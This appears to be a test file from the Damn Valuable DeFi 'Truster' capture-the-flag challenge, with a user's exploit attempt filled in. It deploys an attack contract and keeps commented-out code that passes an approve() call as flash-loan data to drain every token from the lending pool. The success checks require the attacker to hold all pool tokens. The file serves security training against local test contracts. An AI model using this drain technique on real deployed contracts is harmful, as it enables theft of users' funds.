const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */

        const TrustAttackerFactory = await ethers.getContractFactory("TrustAttack",attacker);
        this.attackCon = await TrustAttackerFactory.deploy();

        await this.attackCon.deployed();

        console.log(this.attackCon.address, this.pool.address, this.token.address);
        await this.attackCon.connect(attacker).attack(
            this.pool.address.toLowerCase(),
            this.token.address.toLowerCase(),
            TOKENS_IN_POOL
        );
        // let ABI = [

        //     "function approve(address spender, uint256 amount) external returns (bool)",
        //     "function transfer(address recipient, uint256 amount) external returns (bool)"
        // ];
        // let iface = new ethers.utils.Interface(ABI);

        // let data = iface.encodeFunctionData("approve",[
        //      attacker.address,
        //      TOKENS_IN_POOL
        // ]);

        // let dataTransfer = iface.encodeFunctionData("transfer",[
        //      attacker.address,
        //      TOKENS_IN_POOL
        // ]);
        // await this.pool.connect(attacker).flashLoan(
        //     TOKENS_IN_POOL, //borrowAmount
        //     attacker.address, //borrower
        //     this.token.address, //target
        //     data //data
        // );

        this.token.connect(attacker).approve(this.pool.address,TOKENS_IN_POOL);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

